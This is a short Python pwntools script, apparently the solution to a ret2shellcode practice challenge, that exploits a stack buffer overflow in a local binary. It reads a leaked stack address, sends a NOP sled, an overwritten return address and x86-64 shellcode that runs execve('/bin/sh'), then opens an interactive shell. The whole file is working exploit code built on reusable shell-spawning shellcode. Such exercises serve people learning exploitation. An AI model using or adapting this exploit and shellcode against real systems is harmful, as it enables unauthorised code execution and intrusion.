from pwn import *
context.log_level = 'DEBUG'

flag = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x00\x00\x00\x00\x00"

p = process("./01_ret2shellcode")

input()
p.recvuntil("ID:")
p.sendline("3180103650")

p.recvuntil("0x")
id_addr = p.recvuntil("\n", drop = True)

new_ret_addr = p64(int(id_addr,16) - 8).decode("iso-8859-1")

payload = "\x90"*(256+8) + new_ret_addr + flag

p.recvuntil("me!")
p.sendline(payload)

p.interactive()
